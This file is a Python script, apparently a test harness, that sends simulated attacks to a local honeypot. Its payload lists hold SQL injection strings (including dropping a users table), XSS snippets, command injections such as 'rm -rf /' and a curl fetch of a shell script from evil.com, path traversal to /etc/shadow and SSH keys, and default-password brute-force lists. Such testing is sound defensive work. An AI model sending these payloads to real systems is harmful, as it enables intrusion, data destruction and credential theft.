#!/usr/bin/env python3
"""
Attack Simulator for Honeypot Testing
Simulates various attack patterns against the honeypot system
"""

import requests
import time
import json
from datetime import datetime

HONEYPOT_URL = "http://localhost:3001"

def print_banner():
    print("=" * 60)
    print("🎯 HONEYPOT ATTACK SIMULATOR")
    print("=" * 60)
    print()

def test_sql_injection():
    print("[*] Testing SQL Injection Attacks...")
    
    sql_payloads = [
        "' OR 1=1--",
        "admin'--",
        "'; DROP TABLE users--",
        "' UNION SELECT * FROM users--",
        "1' AND '1'='1",
        "' OR 'a'='a",
    ]
    
    for payload in sql_payloads:
        try:
            response = requests.get(f"{HONEYPOT_URL}/search", params={"q": payload})
            print(f"  ✓ SQL Injection: {payload[:30]}... [{response.status_code}]")
            time.sleep(0.5)
        except Exception as e:
            print(f"  ✗ Error: {e}")
    print()

def test_admin_login():
    print("[*] Testing Admin Login Attacks...")
    
    credentials = [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
        {"username": "administrator", "password": "123456"},
        {"username": "root", "password": "root"},
        {"username": "admin", "password": "admin123"},
    ]
    
    for cred in credentials:
        try:
            response = requests.post(
                f"{HONEYPOT_URL}/admin/login",
                json=cred,
                headers={"Content-Type": "application/json"}
            )
            print(f"  ✓ Login attempt: {cred['username']}/{cred['password']} [{response.status_code}]")
            time.sleep(0.5)
        except Exception as e:
            print(f"  ✗ Error: {e}")
    print()

def test_ssh_brute_force():
    print("[*] Testing SSH Brute-Force Attacks...")
    
    ssh_attempts = [
        {"username": "root", "password": "password"},
        {"username": "root", "password": "toor"},
        {"username": "admin", "password": "admin"},
        {"username": "user", "password": "123456"},
        {"username": "test", "password": "test"},
    ]
    
    for attempt in ssh_attempts:
        try:
            response = requests.post(
                f"{HONEYPOT_URL}/ssh/login",
                json=attempt,
                headers={"Content-Type": "application/json"}
            )
            print(f"  ✓ SSH attempt: {attempt['username']}/{attempt['password']} [{response.status_code}]")
            time.sleep(0.5)
        except Exception as e:
            print(f"  ✗ Error: {e}")
    print()

def test_xss_attacks():
    print("[*] Testing XSS Attacks...")
    
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
    ]
    
    for payload in xss_payloads:
        try:
            response = requests.get(f"{HONEYPOT_URL}/search", params={"q": payload})
            print(f"  ✓ XSS: {payload[:30]}... [{response.status_code}]")
            time.sleep(0.5)
        except Exception as e:
            print(f"  ✗ Error: {e}")
    print()

def test_command_injection():
    print("[*] Testing Command Injection Attacks (CRITICAL)...")
    
    cmd_payloads = [
        {"cmd": "rm -rf /"},
        {"cmd": "cat /etc/passwd"},
        {"cmd": "; ls -la"},
        {"cmd": "| whoami"},
        {"cmd": "$(curl evil.com/shell.sh)"},
    ]
    
    for payload in cmd_payloads:
        try:
            response = requests.post(
                f"{HONEYPOT_URL}/api/exec",
                json=payload,
                headers={"Content-Type": "application/json"}
            )
            print(f"  ✓ Command Injection: {payload['cmd'][:30]}... [{response.status_code}]")
            time.sleep(0.5)
        except Exception as e:
            print(f"  ✗ Error: {e}")
    print()

def test_path_traversal():
    print("[*] Testing Path Traversal Attacks (CRITICAL)...")
    
    paths = [
        "/../../etc/passwd",
        "/../../../etc/shadow",
        "/files/../../../../etc/hosts",
        "/.ssh/id_rsa",
        "/../../var/log/auth.log",
    ]
    
    for path in paths:
        try:
            response = requests.get(f"{HONEYPOT_URL}{path}")
            print(f"  ✓ Path Traversal: {path[:40]}... [{response.status_code}]")
            time.sleep(0.5)
        except Exception as e:
            print(f"  ✗ Error: {e}")
    print()

def main():
    print_banner()
    
    # Check if honeypot is running
    try:
        response = requests.get(HONEYPOT_URL, timeout=2)
        print(f"✓ Honeypot is running at {HONEYPOT_URL}\n")
    except requests.exceptions.RequestException:
        print(f"✗ ERROR: Honeypot not running at {HONEYPOT_URL}")
        print("  Start the honeypot first: cd honey-pot && npm start\n")
        return
    
    start_time = datetime.now()
    
    # Run all attack simulations
    test_sql_injection()
    test_admin_login()
    test_ssh_brute_force()
    test_xss_attacks()
    test_command_injection()
    test_path_traversal()
    
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()
    
    print("=" * 60)
    print(f"✓ Attack simulation completed in {duration:.2f} seconds")
    print(f"✓ Check logs at: honey-pot/logs/honeypot.log.json")
    print("=" * 60)

if __name__ == "__main__":
    main()
